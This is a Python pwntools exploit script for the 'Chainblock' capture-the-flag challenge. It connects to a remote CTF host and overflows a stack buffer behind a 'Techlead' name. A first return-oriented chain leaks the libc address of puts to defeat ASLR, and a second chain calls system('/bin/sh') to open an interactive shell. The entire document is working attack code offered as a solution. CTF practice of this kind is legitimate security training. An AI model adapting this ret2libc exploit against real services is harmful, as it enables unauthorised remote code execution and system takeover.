from pwn import *
import os

run_locally = False
os.chdir("./cor_ctf/Pwn/Chainblock")

elf = ELF("./chainblock")

if run_locally:
    p = elf.process()
else:
    host = "pwn.be.ax"
    port = 5000
    p = remote(host,port)

print(p.recvuntil("name:").decode('utf-8'))

libc = ELF("libc.so.6")

pop_rdi_ret = 0x0000000000401493
puts_got_addr = 0x0000000000404018
puts_plt_addr = 0x401080
main_addr = 0x000000000040124b


rop_chain = [
    pop_rdi_ret, puts_got_addr, puts_plt_addr, main_addr
]

rop_chain = b''.join([ p64(entry) for entry in rop_chain])

payload = b'Techlead' + b'\x00' + b'A'*(16*16-1) + rop_chain
#payload = b'A'*264 + rop_chain

p.sendline(payload)
print(p.recvline().decode('utf-8'))
print(p.recvline().decode('utf-8'))

aslr_puts_addr = u64((p.recvline()[:-1] + b'\x00\x00')[:8])
print("ASLR puts addres:",hex(aslr_puts_addr))
print(p.recvuntil('name:').decode())

#Leaked puts@libc address = \xb0\xa7\x7f
libc.address = aslr_puts_addr - libc.symbols['puts']

pop_rdi = 0x0000000000401493 # pop rdi; ret
bin_sh = next(libc.search(b"/bin/sh"))
ret_gadget = 0x000000000040101a # ret
system_addr = libc.symbols["system"]
print("System addr:",hex(system_addr))
print("Bin_sh addr:",hex(bin_sh))

rop_chain = [
    pop_rdi, bin_sh, ret_gadget, system_addr
]

rop_chain = b''.join([ p64(entry) for entry in rop_chain])
print(rop_chain)
print(len( b'Techlead' + b'\x00' + b'A'*(16*16-1)))

payload = b'Techlead' + b'\x00' + b'A'*(16*16-1) + rop_chain

p.sendline(payload)
p.interactive()
p.close()